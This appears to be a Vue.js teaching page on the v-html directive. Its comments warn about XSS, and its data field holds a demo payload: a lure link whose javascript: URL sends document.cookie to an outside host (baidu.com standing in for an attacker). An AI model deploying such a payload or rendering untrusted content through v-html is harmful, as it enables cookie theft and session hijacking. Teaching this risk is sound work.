<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>v-html指令</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        v-html指令：
            1.作用：向指定节点中渲染包含html的内容。
            2.与赋值语法的区别:
                (1).v-html会替换掉节点中所有的内容
                (2).v-html可以识别html结构
            3.严重注意：v-html的安全问题！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击
                (2).一定要在可信的内容上使用v-html，永远不要用在用户提交的内容
     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <!-- 插值语法 -->
        <h3>{{name}}</h3>
        <h3 v-text="name"></h3>
        <h3 v-html="str"></h3>
    </div>
</body>
<script>
    new Vue({
        el: "#root",
        data: {
            name: '小沈阳',
            str: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>这有你要的资源</a>'
        }
    })
</script>
</html>
